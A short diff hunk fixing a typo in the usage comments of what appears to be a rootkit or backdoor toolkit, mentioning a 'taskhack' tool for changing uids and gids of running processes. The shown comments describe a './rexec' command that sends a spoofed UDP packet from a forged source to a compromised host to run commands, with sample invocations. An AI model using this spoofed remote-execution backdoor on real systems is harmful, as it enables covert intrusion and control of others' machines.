@@ -115,7 +115,7 @@ taskhack Used to change *uid's and *gid's of running processes. Type:
 *	./rexec www.microsoft.com haxored.server.nu /bin/touch /LUDER
 *	This will send a spoofed udp packet from www.microsoft.com:53 to
 *	haxored.server.nu:53, which tells haxored.server.nu to /bin/touch
-*	/LUDER. If you wan't to try this on localhost, don't specify a
+*	/LUDER. If you want to try this on localhost, don't specify a
 *	spoofed address different from your own, since the kernel won't
 *	accept it.
 *	./rexec localhost localhost /bin/touch /LUDER
